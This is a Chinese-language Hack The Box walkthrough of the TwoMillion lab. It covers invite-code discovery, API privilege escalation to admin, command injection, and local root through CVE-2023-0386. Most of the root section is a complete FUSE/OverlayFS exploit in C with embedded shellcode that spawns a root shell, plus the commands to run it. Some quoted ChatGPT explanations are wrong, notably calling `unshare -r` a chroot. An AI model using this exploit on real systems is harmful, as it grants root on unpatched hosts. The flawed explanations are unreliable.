---
typora-copy-images-to: ./image
---

# Hack The Box Level TwoMillion

**写在前面：**Userflag比较简单，System flag要是想弄懂原理的话难一点，单纯的用Exp很easy，但不刨根问底的Haker不是好Haker。

![image-20230628091632345](image/image-20230628091632345.png)

### 信息收集、扫描

拿到IP后先扫一下端口，因为公司限制扫描，这边我就贴一下别人扫描的结果：

```shell
oxdf@hacky$ nmap -p- --min-rate 10000 10.10.10.11
Starting Nmap 7.80 ( https://nmap.org ) at 2023-06-01 16:59 EDT
Nmap scan report for 2million.htb (10.10.10.11)
Host is up (0.097s latency).
Not shown: 65533 closed ports
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 7.18 seconds
oxdf@hacky$ nmap -p 22,80 -sCV 10.10.10.11
Starting Nmap 7.80 ( https://nmap.org ) at 2023-06-01 17:00 EDT
Nmap scan report for 10.10.10.11
Host is up (0.097s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    nginx
|_http-title: Did not follow redirect to http://2million.htb/
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 10.19 seconds
```

只开了80和22端口。ssh基于Openssh，主机貌似是Ubuntu。

```shell
[2023- 6-28 09:23:57 CST] Fanxiaoyao htb/TwoMillion
🔍🤡 -> curl -L 10.10.11.221
curl: (6) Could not resolve host: 2million.htb
```

重定向到2million.htb，在/etc/host中手动解析域名：

```shell
sudo echo '10.10.11.221 2million.htb' >> /etc/host
```

![image-20230628092617936](image/image-20230628092617936.png)

这是17年的HTB主页，本次的Box也是为了纪念HTB达到200万用户而制作的。

扫了一下敏感目录、子域名未果，看看页面中有没有可以利用的点。

发现：

![image-20230628093119436](./image/:Users:fanhexuan:Library:Application%20Support:typora-user-images:image-20230628093119436.png)

```
url:http://2million.htb/invite
```

页面如下：

![image-20230628093452686](image/image-20230628093452686.png)

随便试了几个code不行，抓了个包发现是通过api去验证邀请码。

![image-20230628093830888](image/image-20230628093830888.png)

再看一下前端文件，在JS文件中发现其他函数：

![image-20230628100308075](image/image-20230628100308075.png)

### 获得邀请码

控制台试一下：![image-20230628100919044](image/image-20230628100919044.png)

网上随便找个rot13在线解码：

![image-20230628101019066](image/image-20230628101019066.png)

或者用命令行：

```shell
[2023- 6-28 10:29:35 CST] Fanxiaoyao htb/TwoMillion
🔍🤡 -> echo Va beqre gb trarengr gur vaivgr pbqr, znxr n CBFG erdhrfg gb /ncv/i1/vaivgr/trarengr | tr 'a-zA-Z' 'n-za-mN-ZA-M'
In order to generate the invite code, make a POST request to /api/v1/invite/generate
```

得到api。

用burp post发包得到base64后的code：

![image-20230628101141497](image/image-20230628101141497.png)

b64解码得到：

![image-20230628101246671](image/image-20230628101246671.png)

输入邀请码，来到注册页面：

![image-20230628101443190](image/image-20230628101443190.png)

注册完随后被重定向到登陆页面，用刚刚到帐号成功登陆。![image-20230628101605720](image/image-20230628101605720.png)

### 升级用户到admin

能交互的点不多，侧边的Labs子模块下的Access是一个。
点击connection pack 自动下载了一个openvpn的配置文件，亲测没用。

转而抓包看一下用的哪个API：

![image-20230628101914844](image/image-20230628101914844.png)

改一下请求试一试：

![image-20230628101959566](image/image-20230628101959566.png)

发现了有意思的东西：

![image-20230628103324191](image/image-20230628103324191.png)

试一下/api/v1/admin/auth，目前并不是管理员：

![image-20230628103514423](image/image-20230628103514423.png)

在返回json字符串的最后一段发现：

```json
"PUT":{"\/api\/v1\/admin\/settings\/update":"Update user settings"
```

构造PUT请求：

![image-20230628103642804](image/image-20230628103642804.png)

提示无效的content type，常用的就那几个，这里我用burp FUZZ一下：

![image-20230628103922878](image/image-20230628103922878.png)

记得把自动编码取消掉：

![image-20230628104105229](image/image-20230628104105229.png)

这里大概率是json格式，因为前面的返回数据全都是json。

![image-20230628104136759](image/image-20230628104136759.png)

根据返回的内容修改请求体：

![image-20230628104414215](image/image-20230628104414215.png)

成功将我们的帐号升级为admin。

### 命令注入Getshell

注意到到前面返回到api list中有这么一条：

```json
"POST":{"\/api\/v1\/admin\/vpn\/generate":"Generate VPN for specific user"
```

只有管理员才可以生成调用的API，试一下。

根据返回的要求配置请求：

![image-20230628111812049](image/image-20230628111812049.png)

返回data很像是通过sh文件生成的，后端有可能有sh命令，试一下命令注入：

![image-20230628112104891](image/image-20230628112104891.png)

这里可以直接反向shell了，但是看一下目录下的文件：

![image-20230628112436221](image/image-20230628112436221.png)

.env很奇怪，看一下：

![image-20230628112507823](image/image-20230628112507823.png)

得到用户admin的密码，直接ssh。

### 提权

登陆就看见：

![image-20230628112641678](image/image-20230628112641678.png)

一般只有webserver出问题才会有email，这里去看一眼，先找一下在哪：

```shell
admin@2million:~$ find / -name "mail" 2>/dev/null | grep -v "proc"
/snap/core20/1891/var/mail
/snap/core20/1891/var/spool/mail
/var/spool/mail
/var/mail
/usr/lib/python3/dist-packages/twisted/mail
/usr/lib/byobu/mail
```

```shell
admin@2million:/var/mail$ cat /var/mail/admin
From: ch4p <ch4p@2million.htb>
To: admin <admin@2million.htb>
Cc: g0blin <g0blin@2million.htb>
Subject: Urgent: Patch System OS
Date: Tue, 1 June 2023 10:45:22 -0700
Message-ID: <9876543210@2million.htb>
X-Mailer: ThunderMail Pro 5.2

Hey admin,

I'm know you're working as fast as you can to do the DB migration. While we're partially down, can you also upgrade the OS on our web host? There have been a few serious Linux kernel CVEs already this year. That one in OverlayFS / FUSE looks nasty. We can't get popped by that.

HTB Godfather
```

这里给了提示，内核的提权漏洞OverlayFS / FUSE，Google一下是CVE-2023-0386。

昨天也是看了一天的这个漏洞，简单来说就是OverlayFS将下层文件拷贝到上层文件时，没有对下层文件命名空间的用户是否映射到当前用户命名空间做校对，导致可以设置suid提权。

这里听起来非常的抽象，要了解这个问题首先需要知道几个点：

- 什么是OverlayFS？
- 什么是FUSE？
- 什么是用户命名空间？
- 为什么会提权？

#### 什么是OverlayFS？

> ChatGPT：详细介绍一下linux中的OverlayFS

OverlayFS，又称Overlay文件系统，是Linux内核中的一个联合文件系统，该系统可以将多个不同的文件系统重叠在一起，形成一个单一、统一的视图。它在Linux 3.18版本中正式被内核接纳。

OverlayFS主要有三个重要的组成部分：lower filesystem、upper filesystem和merged filesystem。每个部分的作用如下：

1. **Lower filesystem（下层文件系统）**：这是基础层，通常是只读的。所有文件和目录最初都是从这一层获取的。

2. **Upper filesystem（上层文件系统）**：这是顶层，通常是可写的。当我们对文件系统进行写操作时，所有的更改都会保存在这一层。如果一个文件在lower filesystem中存在，但我们想要修改它，那么这个文件的一个副本就会在upper filesystem中创建，然后进行修改。这个过程称为“copy-up”。

3. **Merged filesystem（合并文件系统）**：这是OverlayFS的最终视图，它将lower和upper filesystem组合在一起。当我们进行读操作时，OverlayFS首先在upper filesystem中查找文件，如果没找到，再在lower filesystem中查找。

这种结构的逻辑视图如下：

```
     ________________
    |                |
    |  Merged View   |
    |________________|
       /          \
____________    ____________
|          |    |          |
|  Lower   |    |  Upper   |
| (read-only)|  | (read-write)|
|____________|  |____________|

```

OverlayFS的一个重要应用是在容器化应用中，特别是在Docker中。在Docker中，每个镜像层都是只读的，并且可以用作其他容器的lower filesystem。当我们启动一个新的容器时，Docker会为其创建一个新的，空的upper filesystem。这样，所有对容器的更改（例如安装新的软件）都只会影响到upper filesystem，而不会影响到共享的镜像层。

此外，由于OverlayFS允许将多个lower filesystem挂载在一个上层下面，我们还可以创建具有多个层次的文件系统，这在Docker中的镜像层次中有广泛的应用。

---

总结来说就是，下层的文件只读，上层的文件可读写，合并层的文件将下上两层的文件合并在一起，显示一个统一的视图。当我们在合并层修改一个存在于下层的文件但是上层并不存在的文件时，会将下层的文件原封不动的复制一份到上层，以供修改。这也是漏洞触发的点。



#### 什么是FUSE？

> GPT：你是一个linux内核专家，现在请详细的解释一下什么是FUSE？

FUSE（Filesystem in Userspace）是一种在用户空间中创建文件系统的机制。它是一个接口，由Linux内核提供，允许用户在不改动内核代码的情况下开发和运行自己的文件系统。

FUSE的主要目标是简化新的文件系统的开发和使用。使用FUSE，你可以创建自定义的文件系统而无需了解许多内核API的细节。这对于调试、快速原型开发、学术研究、实现非常特殊的文件系统（如透明加密文件系统、网络文件系统）等场景非常有用。

在FUSE中，文件系统的大部分逻辑都在用户空间中运行。这使得开发更加容易，因为用户空间提供了更友好的开发环境：你可以使用任何你喜欢的编程语言，你有更多的库可供使用，错误处理更简单，等等。另一方面，这也意味着FUSE文件系统通常比内核空间文件系统更慢，因为它们需要频繁地在用户空间和内核空间之间进行上下文切换。

FUSE文件系统通常由两部分组成：

1. 用户空间的守护进程，它实现了文件系统的实际逻辑。
2. 内核空间的FUSE模块，它处理所有的文件系统操作，将其转发到用户空间的守护进程，然后将结果返回给调用者。

在开发FUSE文件系统时，你需要实现一系列的回调函数，这些函数对应了各种文件系统操作，如打开文件、读取文件、写入文件等。当这些操作发生时，FUSE内核模块会调用相应的回调函数，并将结果返回给调用者。

总的来说，FUSE为在用户空间实现文件系统提供了一个强大的框架，它简化了文件系统的开发，同时也使得文件系统能够以模块化的方式进行扩展和修改。

---

其实Fuse就是允许用户去自定义一个文件系统，以及里面的文件。

我们需要用C语言去编写fuse相关代码。



#### 什么是用户命名空间？

> 你是一个linux内核专家，什么是用户命名空间

在 Linux 中，"命名空间"是一种内核特性，可以用来对进程的视图进行隔离，让进程只能看到属于同一命名空间的资源。每种类型的命名空间都对应一种特定类型的资源。例如，PID（Process ID）命名空间是用来隔离进程ID的，Net命名空间是用来隔离网络接口和网络栈的，Mount命名空间是用来隔离文件系统挂载点的，等等。

用户命名空间（User Namespaces）是 Linux 命名空间的一种，主要用来**隔离用户和用户组ID**。**每个用户命名空间都有一套自己的用户和用户组ID**。例如，**一个进程在用户命名空间 A 中可能以 root 用户（UID 0）运行，但在用户命名空间 B 中，该进程可能只是一个普通用户**。

这样做的好处是，**即使一个进程在其用户命名空间内拥有 root 权限，也无法影响到其他用户命名空间的资源，因为在其他命名空间中，它可能只是一个普通用户**。这大大增加了系统的安全性，使得即使一个容器（它其实就是运行在自己的一套命名空间中的一组进程）被攻击，攻击者也无法影响到主机系统或其他容器。

用户命名空间是 Linux 容器（如 Docker、LXC 等）的核心技术之一。通过使用用户命名空间和其他类型的命名空间，容器可以在不需要虚拟化的情况下提供与虚拟机类似的隔离性。

总的来说，用户命名空间是 Linux 中用来隔离用户和用户组 ID 的一种机制，对于提高系统和容器的安全性，它起着重要的作用。

> 那用户命名空间映射是什么?

在 Linux 的用户命名空间中，我们有一个非常重要的概念：用户命名空间映射。这个映射定义了在不同用户命名空间之间如何转换用户和组 ID。也就是说，**一个在一个用户命名空间内部看起来是 root 的进程，在宿主或者另一个命名空间可能只是一个普通的非特权用户**。

这个映射机制可以通过修改 /proc/[pid]/uid_map 和 /proc/[pid]/gid_map 文件来设定，其中 [pid] 是进程的 PID。在这些文件中，每一行都是一个映射项，由三个字段组成：命名空间内的 ID，命名空间外的 ID，和 ID 的范围。例如，**"0 1000 1" 表示命名空间内的 ID 0 映射到命名空间外的 ID 1000。**

例如，一个在用户命名空间 A 中运行的进程可能有一个用户 ID 为 0，看起来它是 root 用户。但是，如果我们在用户命名空间映射中将 0 映射到了 1000，那么对于宿主命名空间和其他用户命名空间来说，这个进程的用户 ID 就是 1000，也就是一个普通用户。

通过这种方式，用户命名空间映射提供了一种方法，可以让进程在其所在的用户命名空间内拥有完全的权限（例如，root 用户），而在其他命名空间中仍然只是一个普通用户，这对于隔离和安全性非常重要。



#### 为什么会提权？

因为在下层文件系统中的文件是用户高度可控的（fuse生成），可以自定义任何文件，比如一个**suid文件**（但是为了安全起见，FUSE 有一些默认的限制。其中一项限制就是，它默认挂载的文件系统是 `nosuid`，也就是说，FUSE 文件系统上的 setuid 和 setgid 位是被忽略的，**虽然它被fuse忽略，但是suid位仍然存在**。）。但是我们可以通过把一个nosuid系统中suid文件通过overlayFS的特性从下层拷贝到上层，这里的上层是一个正常的文件系统，导致**非法的suid文件获得真正的suid权限**，进而达到提权。



#### 漏洞利用

> https://github.com/Fanxiaoyao66/CVE-2023-0386 <- 这里有我写好的exp，如果你懒得动手做一遍的话。

准备工作需要创建多个文件夹，构建出一个overlayFS。

```shell
cd /tmp
mkdir fuse upper overlay workdir
```

- 其中fuse是用户自定文件系统所在文件夹，也作为overlayFS的下层。

- upper作为overlayFS的上层。

- overlay作为overlayFS的合并层。

- workdir是overlayFS的工作目录。

1、创建fuse文件系统。

下面的fuse代码是我在c师傅的基础上修改的。https://github.com/chenaotian/CVE-2023-0386

```c
#define FUSE_USE_VERSION 30

#include <fuse.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <errno.h>

static const char *hello_path = "/hello";//fuse文件系统中有一个名为hello的文件，这里是文件路径
const char hello_str[] = {//fuse文件系统中的suid 后门文件的二进制内容
    0x7f, 0x45, 0x4c, 0x46, 0x02, 0x01, 0x01, 0x00,
    0x00, 0x56, 0x56, 0x56, 0x56, 0x00, 0x00, 0x00,
    0x02, 0x00, 0x3e, 0x00, 0x01, 0x00, 0x00, 0x00,
    0xb0, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00, 0x00,
    0x40, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x40, 0x00, 0x38, 0x00,
    0x02, 0x00, 0x40, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x01, 0x00, 0x00, 0x00, 0x07, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00, 0x00,
    0xf6, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0xf6, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x10, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x51, 0xe5, 0x74, 0x64, 0x07, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x10, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x31, 0xff, 0x31, 0xd2, 0x31, 0xf6, 0x6a, 0x75,
    0x58, 0x0f, 0x05, 0x31, 0xff, 0x31, 0xd2, 0x31,
    0xf6, 0x6a, 0x77, 0x58, 0x0f, 0x05, 0x6a, 0x68,
    0x48, 0xb8, 0x2f, 0x62, 0x69, 0x6e, 0x2f, 0x2f,
    0x2f, 0x73, 0x50, 0x48, 0x89, 0xe7, 0x68, 0x72,
    0x69, 0x01, 0x01, 0x81, 0x34, 0x24, 0x01, 0x01,
    0x01, 0x01, 0x31, 0xf6, 0x56, 0x6a, 0x08, 0x5e,
    0x48, 0x01, 0xe6, 0x56, 0x48, 0x89, 0xe6, 0x31,
    0xd2, 0x6a, 0x3b, 0x58, 0x0f, 0x05};

static int hellofs_getattr(const char *path, struct stat *stbuf)//获取文件或目录的属性信息的回调函数getattr
{
    int res = 0;

    memset(stbuf, 0, sizeof(struct stat));

    if (strcmp(path, "/") == 0) {//fuse文件系统根目录的权限，0755
        stbuf->st_mode = S_IFDIR | 0755;
        stbuf->st_nlink = 2;
    } else if (strcmp(path, hello_path) == 0) {//hello文件的权限，777并且带有SUID
    stbuf->st_mode = S_IFREG | S_ISUID | 0777;
        stbuf->st_nlink = 1;
        stbuf->st_size = sizeof(hello_str); //hello文件实际大小
    } else {
        res = -ENOENT;
    }

    return res;
}

static int hellofs_readdir(const char *path, void *buf, fuse_fill_dir_t filler,
                           off_t offset, struct fuse_file_info *fi)//获取目录信息的函数
{
    (void) offset;
    (void) fi;

    if (strcmp(path, "/") != 0) {//目前只支持查看fuse的根目录
        return -ENOENT;
    }

    filler(buf, ".", NULL, 0);//默认显示.和..
    filler(buf, "..", NULL, 0);
    filler(buf, hello_path + 1, NULL, 0);//fuse根目录有一个hello文件

    return 0;
}

static int hellofs_open(const char *path, struct fuse_file_info *fi)//打开文件的open回调函数
{
    puts("[+] open_callback");
    puts(path);
    if (strcmp(path, "hello") == 0)
    {
        int fd = open("", fi->flags);

        return -errno;
    }
    return 0;
}

static int hellofs_read(const char *path, char *buf, size_t size, off_t offset,
                        struct fuse_file_info *fi)//读文件的回调函数read
{
    size_t len;
    (void) fi;
    if(strcmp(path, hello_path) != 0) {//只支持读hello文件
        return -ENOENT;
    }
    len = sizeof(hello_str);
    if (offset < len) {
        if (offset + size > len) {
            size = len - offset;
        }
        memcpy(buf, hello_str + offset, size);//返回hello文件的内容，即上面的二进制数组
    } else {
        size = 0;
    }

    return size;
}

static int ioctl_callback(const char *p, int cmd, void *arg,
                          struct fuse_file_info *fi, unsigned int flags, void *data)
{
    puts("[+] ioctl callback");
    printf("path %s\n", p);
    printf("cmd 0x%x\n", cmd);
    return 0;
}

static struct fuse_operations hellofs_oper = {//只实现上述四个回调函数已经够了
    .getattr = hellofs_getattr,
    .readdir = hellofs_readdir,
    .open = hellofs_open,
    .read = hellofs_read,
    .ioctl = ioctl_callback
};

int main(int argc, char *argv[])
{
    return fuse_main(argc, argv, &hellofs_oper, NULL);//注册回调函数
}
```

我在他的基础上添加了一个`ioctl_callback`函数，以供后面touch文件使用，不然会报错函数未实施。

通过scp传送文件到靶机：

```shell
scp ~/Desktop/CVE-2023-0386/fuse.c admin@10.10.11.221:/tmp/root
```

![image-20230628144623425](image/image-20230628144623425.png)

编译：

```shell
gcc fuse.c -o efuse -D_FILE_OFFSET_BITS=64 -lfuse
```

```shell
admin@2million:/tmp/root$ gcc fuse.c -o efuse -D_FILE_OFFSET_BITS=64 -lfuse
admin@2million:/tmp/root$ ls
efuse  fuse  fuse.c  overlay  upper  workdir
```

创建fuse文件系统：

```shell
./efuse fuse
```

看到在fuse文件夹中出现了一个root属主并且具有suid的hello文件：

![image-20230628144906940](image/image-20230628144906940.png)

因为目前在fuse中是nosuid的，所以我们即便执行也无法提权。

2、准备好了fuse文件系统，下一步创建用户命名空间：

```shell
unshare -Urm
```

---

`unshare` 是一个 Linux 命令，用于从当前 shell 进程中"解除共享"某些类型的名称空间。这样做可以创建隔离的环境，类似于虚拟化，但不需要完全的操作系统。

`unshare` 命令后的 `-Urm` 参数各自的含义是：

- `-U` 选项表示解除共享用户名称空间。这会使新的 shell 进程在其自己的用户名称空间中运行，所有的用户和组 ID 映射都是唯一的。这意味着，例如，虽然新 shell 进程可能认为它以 root 用户身份运行，但在外部，它可能以不同的、非特权用户身份运行。
- `-r` 选项表示建立一个新的 root 目录（chroot），这样新的 shell 进程就不能访问实际文件系统的其他部分。这常常用于提供一个隔离的环境，比如在编译软件时，以防止它污染系统的其他部分。
- `-m` 选项表示解除共享 mount 空间。这使得新的 shell 进程可以更改挂载点，而这些更改不会影响到其他进程。例如，它可以挂载新的文件系统，或者更改现有挂载点的属性，而不会影响到系统的其他部分。

综合来看，`unshare -Urm` 命令创建了一个新的、隔离的环境，这个环境有自己的用户、组、挂载点和 root 目录，与系统的其他部分完全隔离。

---

3、创建overlayFS文件系统

使存在后面的fuse文件系统作为下层，upper目录作为上层，overlay作为合并层：

```shell
mount -t overlay overlay -o lowerdir=fuse,upperdir=upper,workdir=workdir overlay
```

这时，在合并层已经出现了hello文件：

![image-20230628150045176](image/image-20230628150045176.png)

这里我们需要修改hello文件以达到将hello复制一份到upper文件的效果，这里我们通过touch命令实现。

**如果touch一个已经存在的文件，那么会修改这个文件的时间戳，时间戳作为文件的元数据被修改，自然也会触发复制。**（如果不在前面增加ioctl_callback的回调函数，无法进行touch）

---

`touch` 命令主要用于修改文件的访问时间和修改时间，或者如果文件不存在，创建新的空文件。在大多数情况下，`touch` 命令并不会直接调用 `ioctl` 函数。它通常调用的系统函数包括 `open`, `close`, `utimes`, 或 `utimensat` 等。

`ioctl` 是一个非常通用的系统调用，用于设备特定的操作或其他无法用标准系统调用表示的操作。例如，它可以用于改变终端的设置或者查询网络设备的状态。然而，`touch` 命令主要与文件系统交互，而不是设备，因此通常不需要使用 `ioctl`。

但是，这并不意味着绝对不会调用 `ioctl`，因为文件系统或者设备驱动可以提供特殊的 `ioctl` 操作来进行特定的功能。例如，某些文件系统可能提供了修改文件时间戳的特定 `ioctl` 操作。然而，这种情况是非常罕见的，不属于常规的 `touch` 命令的行为。

---

可以清楚的看到通过touch文件，我们在upper得到了hello。

![image-20230628150319971](image/image-20230628150319971.png)

随后我们推出出命名空间，执行upper/hello即可提权成功。

![image-20230628150907762](image/image-20230628150907762.png)
